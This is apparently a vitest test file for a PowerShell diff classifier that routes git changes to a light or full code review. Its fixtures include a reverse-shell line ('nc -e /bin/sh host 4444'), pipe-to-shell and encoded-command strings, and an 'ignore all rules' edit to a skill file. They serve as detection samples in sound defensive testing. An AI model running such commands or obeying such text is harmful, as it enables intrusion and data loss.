import { spawnSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

const SKILL = path.resolve(__dirname, '../../packages/delivery/.apm/skills/review-fanout');
const SCRIPT = path.join(SKILL, 'scripts/Classify-Diff.ps1');
const REFERENCE = fs.readFileSync(path.join(SKILL, 'references/mechanical-classifier.md'), 'utf8');
const hasPwsh = spawnSync('pwsh', ['-NoProfile', '-Command', '1']).status === 0;

// The always-full destination list lives in the reference; parse it so docs and tests cannot drift.
const ALWAYS_FULL = (/Always-full rename destinations[^\n]*\n\n```text\n([\s\S]*?)\n```/.exec(REFERENCE)?.[1] ?? '')
  .split('\n')
  .filter(Boolean);

if (!hasPwsh) console.warn('pwsh not found: skipping Classify-Diff.ps1 tests');

it.runIf(!hasPwsh && !!process.env.CI)('pwsh is installed in CI', () => {
  expect(hasPwsh).toBe(true);
});

it('reference documents the always-full destination list', () => {
  expect(ALWAYS_FULL.length).toBeGreaterThan(40);
  expect(ALWAYS_FULL).toEqual(expect.arrayContaining(['package.json', 'jest.config.js', '.eslintrc.js', 'src/index.js', 'vitest.config.ts']));
});

type Result = { mode: string; dimensions: string[]; reason: string };

const hermetic = (home: string): NodeJS.ProcessEnv => {
  const env = { ...process.env };
  for (const k of Object.keys(env)) if (k.startsWith('GIT_') || k === 'XDG_CONFIG_HOME') delete env[k];
  return { ...env, HOME: home, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' };
};

const expectFull = (r: Result, reason?: RegExp) => {
  expect(r.mode).toBe('full');
  expect(r.dimensions).toEqual(['correctness', 'security', 'conventions', 'tests', 'spec']);
  if (reason) expect(r.reason).toMatch(reason);
};
const expectMech = (r: Result) => {
  expect(r.mode).toBe('mechanical');
  expect(r.dimensions).toEqual(['correctness', 'spec']);
  expect(r.reason).toMatch(/^only same-class renames/);
};
const expectSec = (r: Result) => {
  expect(r.mode).toBe('mechanical');
  expect(r.dimensions).toEqual(['correctness', 'security', 'spec']);
};

const TEST_BASE = [
  'const oldName = (n: number) => n + 1;',
  'expect(oldName(1)).toBe(2);',
  "expect(label()).toBe('a');",
  'const first = second;',
  '',
].join('\n');

describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
  let dir: string;
  let home: string;
  const run = (cmd: string, args: string[]) => {
    const r = spawnSync(cmd, args, { cwd: dir, encoding: 'utf8', env: hermetic(home) });
    if (r.status !== 0) throw new Error(r.stderr);
    return r.stdout;
  };
  const git = (...args: string[]) => run('git', args);
  const write = (rel: string, content: string) => {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), content);
  };
  const read = (rel: string) => fs.readFileSync(path.join(dir, rel), 'utf8');
  const mv = (from: string, to: string) => {
    fs.mkdirSync(path.dirname(path.join(dir, to)), { recursive: true });
    git('mv', from, to);
  };
  const classify = (args: string[] = [], env: NodeJS.ProcessEnv = hermetic(home), cwd = dir): Result => {
    const r = spawnSync('pwsh', ['-NoProfile', '-File', SCRIPT, ...args], { cwd, encoding: 'utf8', env });
    expect(r.status).toBe(0);
    return JSON.parse(r.stdout);
  };
  const body = Array.from({ length: 30 }, (_, i) => `line ${i}`).join('\n') + '\n';
  const editFirst = (n: number) =>
    Array.from({ length: 30 }, (_, i) => (i < n ? `edited ${i}` : `line ${i}`)).join('\n') + '\n';

  beforeAll(() => {
    home = fs.mkdtempSync(path.join(os.tmpdir(), 'classify-home-'));
  });
  afterAll(() => fs.rmSync(home, { recursive: true, force: true }));

  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'classify-'));
    git('init', '-q');
    git('config', 'user.email', 't@t');
    git('config', 'user.name', 't');
    git('config', 'commit.gpgsign', 'false');
    write('old/tool.ts', body);
    write('docs/guide.md', body);
    write('docs/auth.md', body);
    write('src/app.ts', body);
    write('src/evil.js', 'require("child_process").execSync("id");\n');
    write('src/app.test.ts', TEST_BASE);
    write('package.json', '{\n  "scripts": {}\n}\n');
    write('requirements.txt', 'requests==1.0\n');
    write('packages/x/.apm/skills/foo/SKILL.md', body);
    write('packages/x/.apm/skills/foo/references/a.md', 'reference a\n');
    write('docs/tool.sh', body);
    write('README.md', body);
    write('apm.yml', 'name: x\n');
    write('marketplace.json', '{\n  "plugins": []\n}\n');
    write('.claude-plugin/plugin.json', '{\n  "name": "x"\n}\n');
    write('docs/my guide.md', body);
    write('src/crlf.test.ts', 'const oldName = 1;\r\nexpect(oldName).toBe(1);\r\n');
    write('src/ctx.test.ts', 'let old = 1;\nfoo(old);\nbar(old);\n');
    write('src/b.test.ts', 'const a = 1;\nconst b = 2;\nexpect(a(b));\n');
    write('src/cm.test.ts', '// note\n/** doc */\nconst `x` = 1;\nlet s = "a"; let t = `a${s}`;\n');
    write('src/m.test.ts', 'const r = f();\nexpect(r).toEqual(2);\n');
    git('add', '.');
    git('commit', '-qm', 'base');
  });
  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

  describe('renames by location class', () => {
    it('same-class source rename is mechanical with correctness and spec', () => {
      git('mv', 'old', 'new');
      expectMech(classify());
    });

    it('package-directory rename with SKILL.md, scripts, references, apm.yml entry and doc mention is mechanical (#178)', () => {
      const pkg = 'packages/development-workflow';
      write(`${pkg}/apm.yml`, 'name: development-workflow\ndescription: workflow skills for delivery\nversion: 1.0.0\nlicense: MIT\nskills:\n  - flow\n');
      write(`${pkg}/.apm/skills/flow/SKILL.md`, '---\nname: flow\n---\nRun the flow.\n');
      write(`${pkg}/.apm/skills/flow/scripts/Run-Flow.ps1`, 'Write-Output "flow"\n');
      write(`${pkg}/.apm/skills/flow/references/steps.md`, 'Step one, step two.\n');
      write('apm.yml', 'name: x\npackages:\n  - packages/development-workflow\n');
      write('docs/guide.md', body.replace('line 3', 'see development-workflow'));
      git('add', '-A');
      git('commit', '-qm', 'pkg');
      git('mv', pkg, 'packages/delivery');
      write('packages/delivery/apm.yml', read('packages/delivery/apm.yml').replace('development-workflow', 'delivery'));
      write('apm.yml', read('apm.yml').replace('development-workflow', 'delivery'));
      write('docs/guide.md', read('docs/guide.md').replace('development-workflow', 'delivery'));
      git('add', '-A');
      const status = git('diff', '--cached', '-M', '--name-status');
      expect(status).toMatch(/^R100\tpackages\/development-workflow\/\.apm\/skills\/flow\/SKILL\.md\tpackages\/delivery\//m);
      expect(status).toMatch(/^R100\t[^\n]*scripts\/Run-Flow\.ps1/m);
      const r = classify();
      expectSec(r);
      expect(r.reason).toMatch(/^only same-class renames and \d+ changed lines/);
    });

    it.each(ALWAYS_FULL)('pure rename src/evil.js -> %s is full', (dest) => {
      if (fs.existsSync(path.join(dir, dest))) {
        git('rm', '-q', dest);
        git('commit', '-qm', 'free destination');
      }
      mv('src/evil.js', dest);
      expect(git('diff', '--cached', '-M', '--name-status')).toBe(`R100\tsrc/evil.js\t${dest}\n`);
      expectFull(classify(), /rename changes location class \(source -> (exec|build|instruction):/);
    });

    it.each([
      ['.github/workflows/a.yml', '.github/workflows/b.yml'],
      ['package.json', 'sub/package.json'],
    ])('same-class rename of an always-full path %s -> %s is full', (from, to) => {
      if (!fs.existsSync(path.join(dir, from))) {
        write(from, 'on: push\n');
        git('add', '-A');
        git('commit', '-qm', 'prep');
      }
      mv(from, to);
      expectFull(classify(), /rename of an always-full path/);
    });

    it('skill reference renamed to SKILL.md is full', () => {
      git('rm', '-q', 'packages/x/.apm/skills/foo/SKILL.md');
      git('commit', '-qm', 'rm');
      git('mv', 'packages/x/.apm/skills/foo/references/a.md', 'packages/x/.apm/skills/foo/SKILL.md');
      expectFull(classify(), /instruction file renamed to another file name/);
    });

    it.each([
      ['docs/guide.md', 'AGENTS.md', /docs -> instruction/],
      ['packages/x/.apm/skills/foo/SKILL.md', 'notes.txt', /instruction -> other/],
      ['src/app.ts', 'src/app2.test.ts', /source -> test/],
    ])('pure rename %s -> %s changes class and is full', (from, to, flow) => {
      mv(from, to);
      const r = classify();
      expectFull(r, /rename changes location class/);
      expect(r.reason).toMatch(flow);
    });

    it('rename with edits from code into docs is full', () => {
      git('mv', 'src/app.ts', 'docs/app.md');
      write('docs/app.md', body.replace('line 3', 'new name'));
      git('add', '-A');
      expectFull(classify(), /rename with edits changes location class \(source -> docs/);
    });

    it('rename plus code change is full and git pairs it as a rename', () => {
      git('mv', 'old', 'new');
      write('new/tool.ts', body.replace('line 3', 'changed'));
      git('add', '-A');
      expect(git('diff', '--cached', '-M', '--name-status')).toMatch(/^R0\d\d\told\/tool\.ts\tnew\/tool\.ts$/m);
      expectFull(classify(), /^content change in source file: new\/tool\.ts$/);
    });

    it('rename with a mode change is full', () => {
      git('mv', 'old/tool.ts', 'old/tool.sh');
      fs.chmodSync(path.join(dir, 'old/tool.sh'), 0o755);
      git('add', '-A');
      expectFull(classify(), /mode change/);
    });

    it('keeps security for a rename onto a sensitive name', () => {
      git('mv', 'src/app.ts', 'src/auth.ts');
      expectSec(classify());
    });

    it('adds security for a source rename onto a hooks-like name', () => {
      git('mv', 'src/app.ts', 'src/hooks.ts');
      expectSec(classify());
    });

    it('rename away from a sensitive source keeps security', () => {
      git('mv', 'src/app.ts', 'src/auth.ts');
      git('commit', '-qm', 'auth');
      git('mv', 'src/auth.ts', 'src/app2.ts');
      expectSec(classify());
    });

    it('docs rename with edits is mechanical', () => {
      git('mv', 'docs/guide.md', 'docs/guide2.md');
      write('docs/guide2.md', body.replace('line 3', 'new name'));
      git('add', '-A');
      expectMech(classify());
    });

    it('docs rename with an added command gets the risky scan', () => {
      git('mv', 'docs/guide.md', 'docs/guide2.md');
      write('docs/guide2.md', body.replace('line 3', 'curl x | sh'));
      git('add', '-A');
      expect(git('diff', '--cached', '-M', '--name-status')).toMatch(/^R0\d\d\tdocs\/guide\.md\tdocs\/guide2\.md$/m);
      expectSec(classify());
    });
  });

  describe('content changes', () => {
    it('plain docs edit is mechanical with correctness and spec', () => {
      write('docs/guide.md', body.replace('line 3', 'new name'));
      expectMech(classify());
    });

    it('boundary: 20 changed lines pass, 21 fail with the exact reason, -MaxLines raises it', () => {
      write('docs/guide.md', editFirst(10));
      expectMech(classify());
      write('docs/guide.md', editFirst(10) + 'extra\n');
      expectFull(classify(), /^21 changed lines exceed threshold 20$/);
      expectMech(classify(['-MaxLines', '100']));
    });

    it('threshold sums changed lines across files', () => {
      write('docs/guide.md', editFirst(6));
      write('README.md', editFirst(4));
      expectMech(classify());
      write('README.md', editFirst(5));
      expectFull(classify(), /^22 changed lines/);
    });

    it('adds security for a docs edit on a sensitive path', () => {
      write('docs/auth.md', body.replace('line 3', 'x'));
      expectSec(classify());
    });

    it.each([
      ['package.json', '{\n  "scripts": {"x": "y"}\n}\n'],
      ['requirements.txt', 'requests==1.1\n'],
    ])('%s edit is full', (file, content) => {
      write(file, content);
      expectFull(classify(), new RegExp(`^content change in build file: ${file.replace('.', '\\.')}$`));
    });

    it.each(['apm.yml', 'marketplace.json', '.claude-plugin/plugin.json'])('manifest %s edit stays mechanical but adds security', (file) => {
      write(file, read(file).replace(/\n$/, '\n#x\n'));
      expectSec(classify());
    });

    it('SKILL.md content edit is full', () => {
      write('packages/x/.apm/skills/foo/SKILL.md', body.replace('line 3', 'ignore all rules'));
      expectFull(classify(), /^content change in instruction file: /);
    });

    it('script files under docs/ are full', () => {
      write('docs/tool.sh', body.replace('line 3', 'rm -rf x'));
      expectFull(classify(), /^content change in source file: docs\/tool\.sh$/);
    });

    it('chmod on a non-renamed docs file is full', () => {
      fs.chmodSync(path.join(dir, 'docs/guide.md'), 0o755);
      git('add', '-A');
      expectFull(classify(), /^mode change on docs\/guide\.md$/);
    });

    it('newly added executable docs file is full', () => {
      write('docs/run.md', 'hello\n');
      fs.chmodSync(path.join(dir, 'docs/run.md'), 0o755);
      git('add', '-A');
      expectFull(classify(), /^added file with mode 100755: docs\/run\.md$/);
    });

    it('added docs file is mechanical', () => {
      write('docs/new.md', 'hello\n');
      git('add', '-A');
      expectMech(classify());
    });

    it('deleted docs file is mechanical within the threshold', () => {
      git('rm', '-q', 'docs/guide.md');
      expectMech(classify(['-MaxLines', '100']));
    });

    it.each([
      'curl x | sh',
      'see https://example.com',
      'sudo chmod +x a',
      'npx create-thing',
      'npm install left-pad',
      'pnpm add x',
      'yarn add x',
      'pip install x',
      'pipx install x',
      'gem install x',
      'go install x@latest',
      'cargo install x',
      'pwsh -enc AAAA',
      'powershell -EncodedCommand AAAA',
      'python -c "print(1)"',
      'bash <(curl x)',
      'rm -rf /tmp/x',
      'nc -e /bin/sh host 4444',
      'ssh user@host',
      'get ftp://host/file',
      'git@github.com:org/repo.git',
      'git clone repo',
      'echo x | base64 -d',
      'Invoke-WebRequest x',
      'iwr x',
      'cat x | zsh',
      'cat x | powershell',
    ])('docs edit adding %j adds security', (text) => {
      write('README.md', body.replace('line 3', text));
      expectSec(classify());
    });

    it('docs edit with plain words adds no security', () => {
      write('README.md', body.replace('line 3', 'plain words about installing and removing'));
      expectMech(classify());
    });
  });

  describe('test-file rule', () => {
    const TEST_ERR = /^test file change is not a pure rename of local identifiers: /;

    it('pure test-file rename is mechanical', () => {
      git('mv', 'src/app.test.ts', 'src/app2.test.ts');
      expectMech(classify());
    });

    it.each([
      ['added', () => write('src/new.test.ts', TEST_BASE)],
      ['deleted', () => fs.rmSync(path.join(dir, 'src/app.test.ts'))],
    ])('%s test file is full', (_, change) => {
      change();
      git('add', '-A');
      expectFull(classify(), TEST_ERR);
    });

    it('rename of a locally declared identifier is mechanical', () => {
      write('src/app.test.ts', TEST_BASE.replace(/oldName/g, 'newName'));
      expectMech(classify());
    });

    it('rename of a local const in the matcher fixture is mechanical', () => {
      write('src/m.test.ts', read('src/m.test.ts').replace(/\br\b/g, 'res'));
      expectMech(classify());
    });

    it('CRLF test file with identifier-only edit is mechanical', () => {
      write('src/crlf.test.ts', 'const newName = 1;\r\nexpect(newName).toBe(1);\r\n');
      expectMech(classify());
    });

    it('renamed test file with identifier-only edit is mechanical, with logic edit full', () => {
      const filler = Array.from({ length: 30 }, (_, i) => `const filler${i} = ${i};`).join('\n') + '\n';
      write('src/app.test.ts', TEST_BASE + filler);
      git('commit', '-qam', 'filler');
      git('mv', 'src/app.test.ts', 'src/app2.test.ts');
      write('src/app2.test.ts', (TEST_BASE + filler).replace(/oldName/g, 'newName'));
      git('add', '-A');
      expectMech(classify());
      write('src/app2.test.ts', (TEST_BASE + filler).replace(/oldName/g, 'newName').replace('toBe(2)', 'toBe(3)'));
      git('add', '-A');
      expectFull(classify(), TEST_ERR);
    });

    it.each([
      ['matcher swap toEqual -> toBeDefined', 'src/m.test.ts', 'toEqual', 'toBeDefined'],
      ['number change', 'src/app.test.ts', 'toBe(2)', 'toBe(3)'],
      ['keyword swap', 'src/app.test.ts', 'const first', 'let first'],
      ['string literal change', 'src/app.test.ts', "toBe('a')", "toBe('b')"],
      ['undeclared call target rename', 'src/app.test.ts', 'label()', 'other()'],
      ['non-injective self assignment', 'src/app.test.ts', 'const first = second;', 'const x = x;'],
      ['merge onto an existing name', 'src/app.test.ts', 'const first = second;', 'const second = second;'],
      ['merge onto an existing argument', 'src/b.test.ts', 'expect(a(b));', 'expect(b(b));'],
      ['old token surviving in a context line', 'src/ctx.test.ts', 'let old = 1;\nfoo(old);', 'let renamed = 1;\nfoo(renamed);'],
      ['pure deletion of a line', 'src/app.test.ts', "expect(label()).toBe('a');\n", ''],
      ['comment change', 'src/cm.test.ts', '// note', '// other'],
      ['JSDoc change', 'src/cm.test.ts', '/** doc */', '/** docs */'],
      ['double-quoted string change', 'src/cm.test.ts', '"a"', '"b"'],
      ['template string change', 'src/cm.test.ts', '`a${s}`', '`b${s}`'],
    ])('%s is full', (_, file, from, to) => {
      const before = read(file);
      expect(before).toContain(from);
      write(file, before.replace(from, to));
      expectFull(classify(), TEST_ERR);
    });

    it.each(['NaN', 'Math', 'process', 'undefined', 'globalThis', 'require', 'self', 'toBe'])(
      'local renamed to builtin or matcher %s is full',
      (name) => {
        write('src/m.test.ts', read('src/m.test.ts').replace(/\br\b/g, name));
        expectFull(classify(), TEST_ERR);
      },
    );

    it.each([
      ['named import', 'import { oldName } from "./app";\nexpect(oldName(1)).toBe(2);\n'],
      ['object destructuring', 'const { oldName } = mod;\nexpect(oldName(1)).toBe(2);\n'],
      ['member access', 'const oldName = 1;\nexpect(obj.oldName).toBe(oldName);\n'],
      ['optional member call', 'const oldName = 1;\nexpect(obj?.oldName()).toBe(oldName);\n'],
      ['object key', 'const oldName = 1;\nconst o = { oldName: 2 };\nexpect(o).toBe(oldName);\n'],
      ['shorthand property', 'const oldName = 1;\nexpect({ oldName }).toEqual(x);\n'],
      ['python keyword argument', 'def f(oldName):\n    return g(oldName=oldName)\n'],
    ])('rename through a %s is full', (_, content) => {
      write('src/k.test.ts', content);
      git('add', '-A');
      git('commit', '-qm', 'prep');
      write('src/k.test.ts', content.replace(/oldName/g, 'newName'));
      expectFull(classify(), TEST_ERR);
    });

    it('inconsistent rename is full', () => {
      write('src/app.test.ts', TEST_BASE.replace('oldName(1)', 'other(1)').replace('const oldName', 'const newName'));
      expectFull(classify(), TEST_ERR);
    });

    it('rename onto a name already used elsewhere is full', () => {
      write('src/app.test.ts', TEST_BASE.replace(/oldName/g, 'first'));
      expectFull(classify(), TEST_ERR);
    });

    it('added assertion is full', () => {
      write('src/app.test.ts', TEST_BASE + 'expect(1).toBe(1);\n');
      expectFull(classify(), TEST_ERR);
    });

    it('rename that makes an assertion tautological is full', () => {
      write('src/app.test.ts', 'const x = 1;\nconst expected = 1;\nexpect(x).toBe(expected);\n');
      git('commit', '-qam', 'prep');
      write('src/app.test.ts', 'const x = 1;\nconst x = 1;\nexpect(x).toBe(x);\n');
      expectFull(classify(), TEST_ERR);
    });
  });

  describe('ranges, git state and failures', () => {
    it('-Force full overrides a mechanical diff', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      expectFull(classify(['-Force', 'full']), /forced/);
    });

    it('untracked files in working-tree mode are full', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      write('src/evil.ts', 'x\n');
      expectFull(classify(), /untracked/);
    });

    it('explicit committed range is classified from that range', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      git('commit', '-qam', 'docs');
      write('untracked.ts', 'x\n');
      expectMech(classify(['-Range', 'HEAD~1..HEAD']));
      write('src/app.ts', body.replace('line 3', 'code'));
      git('commit', '-qam', 'code');
      expectFull(classify(['-Range', 'HEAD~2..HEAD']), /^content change in source file: src\/app\.ts$/);
    });

    it('three-dot range is classified', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      git('commit', '-qam', 'docs');
      expectMech(classify(['-Range', 'HEAD~1...HEAD']));
    });

    it('path with spaces is handled', () => {
      write('docs/my guide.md', body.replace('line 3', 'x'));
      expectMech(classify());
    });

    it('empty diff fails closed to full', () => {
      expectFull(classify(), /empty/);
    });

    it('bad range fails closed to full', () => {
      expectFull(classify(['-Range', 'nope..alsonope']), /invalid range/);
    });

    it('range starting with a dash fails closed to full', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      expectFull(classify(['-Range:--output=out.txt']), /invalid range/);
      expect(fs.existsSync(path.join(dir, 'out.txt'))).toBe(false);
    });

    it('binary files fail closed to full', () => {
      fs.writeFileSync(path.join(dir, 'docs/img.md'), Buffer.from([0, 1, 2, 0, 255]));
      git('add', '-A');
      expectFull(classify(['-Range', 'HEAD']), /binary/);
    });

    it('symlink is full', () => {
      fs.symlinkSync('x', path.join(dir, 'docs/link.md'));
      git('add', '-A');
      expectFull(classify(), /^symlink or submodule: docs\/link\.md$/);
    });

    it('submodule is full', () => {
      git('update-index', '--add', '--cacheinfo', '160000,' + 'a'.repeat(40) + ',sub');
      git('commit', '-qm', 'sub');
      expectFull(classify(['-Range', 'HEAD~1..HEAD']), /^symlink or submodule: sub$/);
    });

    it('type change from file to symlink is full', () => {
      fs.rmSync(path.join(dir, 'docs/guide.md'));
      fs.symlinkSync('x', path.join(dir, 'docs/guide.md'));
      git('add', '-A');
      expectFull(classify(), /symlink|unsupported/);
    });

    it('non-git working directory is full with exit 0', () => {
      const plain = fs.mkdtempSync(path.join(os.tmpdir(), 'classify-nogit-'));
      try {
        expectFull(classify([], { ...hermetic(home), GIT_CEILING_DIRECTORIES: path.dirname(plain) }, plain), /failed/);
      } finally {
        fs.rmSync(plain, { recursive: true, force: true });
      }
    });

    const withFakeGit = (script: string[], fn: (env: NodeJS.ProcessEnv) => void) => {
      const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'fakegit-'));
      try {
        const fake = path.join(bin, 'git');
        fs.writeFileSync(fake, ['#!/bin/sh', ...script, ''].join('\n'));
        fs.chmodSync(fake, 0o755);
        fn({ ...process.env, PATH: `${bin}${path.delimiter}${process.env.PATH}` });
      } finally {
        fs.rmSync(bin, { recursive: true, force: true });
      }
    };

    it('failing git is full with reason failed and exit 0', () => {
      withFakeGit(['exit 1'], (env) => expectFull(classify([], env), /failed/));
    });

    it('a crash inside the script still emits full JSON and exit 0', () => {
      withFakeGit(
        [
          'for a in "$@"; do',
          '  case "$a" in',
          "    --raw) printf ':100644 100644 a b M\\tdocs/a.md\\n';;",
          "    --numstat) printf 'x\\ty\\tdocs/a.md\\n';;",
          '  esac',
          'done',
          'exit 0',
        ],
        (env) => expectFull(classify([], env), /script error/),
      );
    });
  });
});
